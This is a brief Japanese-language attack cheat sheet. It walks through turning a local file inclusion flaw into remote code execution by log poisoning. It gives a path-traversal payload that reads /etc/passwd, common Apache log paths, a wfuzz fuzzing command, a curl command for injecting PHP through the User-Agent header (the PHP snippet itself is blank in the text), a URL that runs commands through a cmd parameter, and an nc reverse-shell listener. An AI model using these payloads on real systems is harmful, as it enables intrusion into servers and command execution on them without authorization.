# Log Poisoning Attack Flow

    
    
    LFI脆弱性の特定：パラメータを介してアプリケーションがローカルファイルを読み込んでいるか確認する
    http://TARGET/?page=../../../../../../etc/passwd

    ログファイルの発見
    ログファイルの場所を特定：Webサーバーのアクセスログやプロセスのファイル記述子を探索する。
    一般的なパス：
    Apache (Debian/Ubuntu): /var/log/apache2/access.log
    Apache (RHEL/CentOS): /var/log/httpd/access_log
    wfuzz -c -z file,/usr/share/wordlists/LFI.txt [フィルターオプション] "http://TARGETIP/?PARAMETER=../../../../../../FUZZ"

    ポイズニング（注入）
    PHPコードの注入：curlを使用して、User-Agentヘッダーに悪意のあるPHPスニペットを送信する。
    コマンド：curl http://TARGETIP -A ""

    RCE（遠隔コード実行）の実行
    ペイロードの起動：LFIを介してポイズニングされたログファイルにアクセスし、cmdパラメータを通じてコマンドを渡す。
    URL: http://TARGET/?PARAMETER=[LOG_PATH]&cmd=id

    リバースシェル（最終段階）
    接続の確立：リバースシェルコマンドを送信し、ターゲットへのインタラクティブなアクセスを取得する。
    リスナー：nc -lvnp [ポート番号]
